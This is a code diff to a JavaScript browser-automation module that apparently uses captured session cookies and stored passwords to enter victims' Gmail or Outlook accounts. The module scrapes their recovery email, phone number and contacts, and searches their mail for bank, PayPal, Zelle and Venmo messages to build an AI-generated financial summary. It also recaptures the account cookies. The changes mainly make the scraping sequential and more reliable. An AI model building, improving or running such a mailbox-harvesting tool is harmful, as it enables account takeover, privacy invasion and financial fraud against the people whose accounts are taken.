@@ -174,9 +174,11 @@ async function extractPersonalInfo(page, platform) {
         }
     }
 
+    // Try direct navigation to myaccount.google.com (gotoRobust may redirect)
     for (const url of sites) {
         try {
-            await gotoRobust(page, url);
+            // Use page.goto directly with networkidle2 to ensure full page load
+            await page.goto(url, { waitUntil: 'networkidle2', timeout: 30000 });
             const currentUrl = page.url();
             const pageTitle = await page.title();
             if (isSignInPage(currentUrl)) {
@@ -191,6 +193,8 @@ async function extractPersonalInfo(page, platform) {
                 continue;
             }
             logger.info(`[smartExtract] personal info nav OK: url=${currentUrl}, title="${pageTitle}"`);
+            // Wait for page to fully render
+            await sleep(2000);
             raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
             logger.info(`[smartExtract] personal info raw length: ${raw.length} chars`);
             if (raw.length > 50) break;
@@ -436,8 +440,13 @@ async function extractContacts(page, platform, maxContacts = 200) {
                 continue;
             }
 
-            // Wait for contacts to load
-            await sleep(2000);
+            // Wait for contact list to render — look for XXcuqd rows
+            try {
+                await page.waitForSelector('div.XXcuqd[role="presentation"]', { timeout: 15000 });
+                logger.info(`[smartExtract] contacts ${url}: contact list appeared`);
+            } catch (e) {
+                logger.warn(`[smartExtract] contacts ${url}: no contact list after 15s`);
+            }
 
             const pageTitle = await page.title();
             const pageUrl = page.url();
@@ -446,28 +455,18 @@ async function extractContacts(page, platform, maxContacts = 200) {
             // Dump HTML snippet for first page to find correct selectors
             if (contacts.length === 0 && url === contactPages[0]) {
                 const htmlSnippet = await page.evaluate(() => {
-                    // Find elements that look like contact rows
-                    const allElements = document.querySelectorAll('*');
-                    const candidates = [];
-                    for (const el of allElements) {
-                        const text = el.textContent?.trim() || '';
-                        const hasEmail = text.includes('@');
-                        const tagName = el.tagName.toLowerCase();
-                        const className = el.className || '';
-                        const role = el.getAttribute('role') || '';
-                        if (hasEmail && text.length < 200 && (tagName === 'div' || tagName === 'tr' || tagName === 'li')) {
-                            candidates.push(`<${tagName} class="${className}" role="${role}">${text.slice(0, 100)}`);
-                        }
-                    }
-                    // Also get a broader HTML sample
-                    const bodyHTML = document.body.innerHTML;
-                    // Find first 2000 chars after any "contact" text
-                    const contactIdx = bodyHTML.toLowerCase().indexOf('contact');
-                    const snippet = contactIdx >= 0 ? bodyHTML.slice(contactIdx, contactIdx + 3000) : bodyHTML.slice(0, 3000);
-                    return { candidates: candidates.slice(0, 10), snippet };
+                    const diag = {
+                        XXcuqd: document.querySelectorAll('div.XXcuqd[role="presentation"]').length,
+                        AYDrSb: document.querySelectorAll('div.AYDrSb').length,
+                        dataEmail: document.querySelectorAll('[data-email]').length,
+                        phoneCol: document.querySelectorAll('[aria-describedby*="phone-column"]').length,
+                        taglineCol: document.querySelectorAll('[aria-describedby*="generated-tagline-column"]').length,
+                        allDivs: document.querySelectorAll('div').length,
+                        title: document.title,
+                    };
+                    return diag;
                 });
-                logger.info(`[smartExtract] contacts HTML candidates: ${JSON.stringify(htmlSnippet.candidates)}`);
-                logger.info(`[smartExtract] contacts HTML snippet (first 500): ${htmlSnippet.snippet.slice(0, 500)}`);
+                logger.info(`[smartExtract] contacts HTML diag: ${JSON.stringify(htmlSnippet)}`);
             }
 
             for (let i = 0; i < 8; i++) {
@@ -911,55 +910,62 @@ async function extractWire(session, browserId) {
     const cookieJSON = session.cookieJSON;
     const platform = session.platform === 'gmail' || session.platform === 'outlook' ? session.platform : 'gmail';
     const start = Date.now();
-    let tabs = [];
 
-    // Financial search batches for parallel execution
+    // Financial search batches
     const BATCH1 = ['invoice', 'payment', 'receipt'];
     const BATCH2 = ['bank', 'transfer', 'paypal'];
     const BATCH3 = ['zelle', 'venmo', 'transaction'];
+    const PHASES = 7;
 
     const { browser, page } = await launchBrowserWithSession(cookieJSON);
     try {
-        // Create 6 tabs: box, contacts, financial×3, activities (personal uses main page)
-        tabs = await Promise.all([
-            createTab(browser, cookieJSON),
-            createTab(browser, cookieJSON),
-            createTab(browser, cookieJSON),
-            createTab(browser, cookieJSON),
-            createTab(browser, cookieJSON),
-            createTab(browser, cookieJSON),
-        ]);
-
-        // Run all phases in parallel — each gets its own tab (no shared page conflicts)
-        const phases = [
-            ['personal', () => extractPersonalInfo(page, platform)],
-            ['box', () => extractBoxSummary(tabs[0], platform)],
-            ['contacts', () => extractContacts(tabs[1], platform)],
-            ['financial1', () => collectEmailTexts(tabs[2], platform, 10, BATCH1)],
-            ['financial2', () => collectEmailTexts(tabs[3], platform, 10, BATCH2)],
-            ['financial3', () => collectEmailTexts(tabs[4], platform, 10, BATCH3)],
-            ['activities', () => extractActivities(tabs[5], platform, 50)],
-        ];
-
         let done = 0;
-        const results = await Promise.all(phases.map(async ([label, fn]) => {
-            const tabStart = Date.now();
-            try {
-                const r = await fn();
-                done++;
-                logger.info(`[smartExtract] tab DONE ${label} in ${Date.now() - tabStart}ms`);
-                if (browserId) await updateExtractStatus(browserId, `extracting (${done}/${phases.length})`);
-                return r;
-            } catch (e) {
-                done++;
-                logger.warn(`[smartExtract] tab FAIL ${label}: ${e.message}`);
-                if (browserId) await updateExtractStatus(browserId, `extracting (${done}/${phases.length})`);
-                return label === 'contacts' ? [] : [];
-            }
-        }));
+        const update = (label) => { done++; if (browserId) updateExtractStatus(browserId, `extracting ${label} (${done}/${PHASES})`); };
+
+        // Phase 1: Box Summary (navigates to #inbox)
+        logger.info(`[smartExtract] phase 1/${PHASES}: box`);
+        let box = {};
+        try { box = await extractBoxSummary(page, platform); } catch (e) { logger.warn(`[smartExtract] box failed: ${e.message}`); }
+        update('box');
+
+        // Phase 2: Financial batch 1 (invoice, payment, receipt)
+        logger.info(`[smartExtract] phase 2/${PHASES}: financial1`);
+        let financial1 = [];
+        try { financial1 = await collectEmailTexts(page, platform, 10, BATCH1); } catch (e) { logger.warn(`[smartExtract] financial1 failed: ${e.message}`); }
+        update('financial1');
+
+        // Phase 3: Financial batch 2 (bank, transfer, paypal)
+        logger.info(`[smartExtract] phase 3/${PHASES}: financial2`);
+        let financial2 = [];
+        try { financial2 = await collectEmailTexts(page, platform, 10, BATCH2); } catch (e) { logger.warn(`[smartExtract] financial2 failed: ${e.message}`); }
+        update('financial2');
+
+        // Phase 4: Financial batch 3 (zelle, venmo, transaction)
+        logger.info(`[smartExtract] phase 4/${PHASES}: financial3`);
+        let financial3 = [];
+        try { financial3 = await collectEmailTexts(page, platform, 10, BATCH3); } catch (e) { logger.warn(`[smartExtract] financial3 failed: ${e.message}`); }
+        update('financial3');
+
+        // Phase 5: Activities (navigates to #inbox, #sent)
+        logger.info(`[smartExtract] phase 5/${PHASES}: activities`);
+        let activities = [];
+        try { activities = await extractActivities(page, platform, 50); } catch (e) { logger.warn(`[smartExtract] activities failed: ${e.message}`); }
+        update('activities');
+
+        // Phase 6: Personal Info (navigates to myaccount.google.com)
+        logger.info(`[smartExtract] phase 6/${PHASES}: personal`);
+        let personal = {};
+        try { personal = await extractPersonalInfo(page, platform); } catch (e) { logger.warn(`[smartExtract] personal failed: ${e.message}`); }
+        update('personal');
+
+        // Phase 7: Contacts (navigates to contacts.google.com)
+        logger.info(`[smartExtract] phase 7/${PHASES}: contacts`);
+        let contacts = [];
+        try { contacts = await extractContacts(page, platform); } catch (e) { logger.warn(`[smartExtract] contacts failed: ${e.message}`); }
+        update('contacts');
 
         // Merge financial batches and run AI analysis
-        const allFinancialTexts = [...results[3], ...results[4], ...results[5]];
+        const allFinancialTexts = [...financial1, ...financial2, ...financial3];
         let financialSummary = {};
         try {
             financialSummary = await aiService.extractFinancialSummaryAI(allFinancialTexts);
@@ -971,34 +977,31 @@ async function extractWire(session, browserId) {
         const mentions = /(invoice|payment|receipt|bank|transfer|paypal|zelle|venmo|transaction)/i.test(combined);
 
         // Log extraction counts
-        const personal = results[0] || {};
-        const box = results[1] || {};
-        const contactsList = results[2] || [];
         logger.info(`[smartExtract] COUNTS: personal(name=${personal.name || 'N/A'}, email=${personal.recoveryEmail || 'N/A'}, phone=${personal.phone || 'N/A'})`);
         logger.info(`[smartExtract] COUNTS: box(total=${box.totalEmails || 0}, unread=${box.unreadEmails || 0}, folders=${(box.folders || []).length})`);
-        logger.info(`[smartExtract] COUNTS: contacts=${contactsList.length}`);
-        logger.info(`[smartExtract] COUNTS: financial=${allFinancialTexts.length} (f1=${(results[3] || []).length}, f2=${(results[4] || []).length}, f3=${(results[5] || []).length})`);
-        logger.info(`[smartExtract] COUNTS: activities=${(results[6] || []).length}`);
+        logger.info(`[smartExtract] COUNTS: contacts=${contacts.length}`);
+        logger.info(`[smartExtract] COUNTS: financial=${allFinancialTexts.length} (f1=${financial1.length}, f2=${financial2.length}, f3=${financial3.length})`);
+        logger.info(`[smartExtract] COUNTS: activities=${activities.length}`);
 
         logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
         return {
             timestamp: new Date().toISOString(),
             emailAddress: session.email,
             passwordHint: session.password ? 'stored' : null,
-            personalInfo: results[0],
-            boxSummary: results[1],
-            contacts: results[2],
+            personalInfo: personal,
+            boxSummary: box,
+            contacts: contacts,
             ...financialSummary,
             financialMentions: mentions,
-            activities: results[6],
+            activities: activities,
             extractedFrom: platform,
             extractedAt: new Date().toISOString(),
             _diagnostics: {
-                personal: results[0]?._diag || {},
-                box: results[1]?._diag || {},
-                contactsCount: (results[2] || []).length,
+                personal: personal._diag || {},
+                box: box._diag || {},
+                contactsCount: contacts.length,
                 financialCount: allFinancialTexts.length,
-                activitiesCount: (results[6] || []).length,
+                activitiesCount: activities.length,
             },
         };
     } finally {
@@ -1016,10 +1019,7 @@ async function extractWire(session, browserId) {
             logger.warn(`[smartExtract] Cookie capture failed: ${e.message}`);
         }
         // Close browser BEFORE zipping to release file locks
-        await Promise.all([
-            page.close().catch(() => {}),
-            ...tabs.map(t => t.close().catch(() => {})),
-        ]);
+        await page.close().catch(() => {});
         await browser.close().catch(() => {});
         // Small delay to let OS release file locks
         await new Promise(r => setTimeout(r, 1000));
